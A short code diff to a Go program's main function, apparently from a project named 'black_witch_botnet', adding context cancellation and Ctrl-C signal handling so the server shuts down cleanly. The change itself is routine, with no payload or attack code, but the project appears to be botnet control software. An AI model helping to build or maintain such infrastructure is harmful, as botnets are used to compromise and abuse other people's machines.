@@ -2,7 +2,11 @@ package main
 
 import (
 	"black_witch_botnet/server"
+	"context"
 	"flag"
+	"fmt"
+	"os"
+	"os/signal"
 )
 
 func main() {
@@ -27,5 +31,25 @@ func main() {
 		Control: c,
 	}
 
-	r.Run()
+	ctx := context.Background()
+	ctx, cancel := context.WithCancel(ctx)
+
+	i := make(chan os.Signal)
+	signal.Notify(i, os.Interrupt)
+
+	defer func() {
+		signal.Stop(i)
+		cancel()
+	}()
+
+	go func() {
+		select {
+		case sig := <-i:
+			fmt.Printf("Got %s signal. Aborting...\n", sig)
+			cancel()
+		case <-ctx.Done():
+		}
+	}()
+
+	r.Run(ctx)
 }
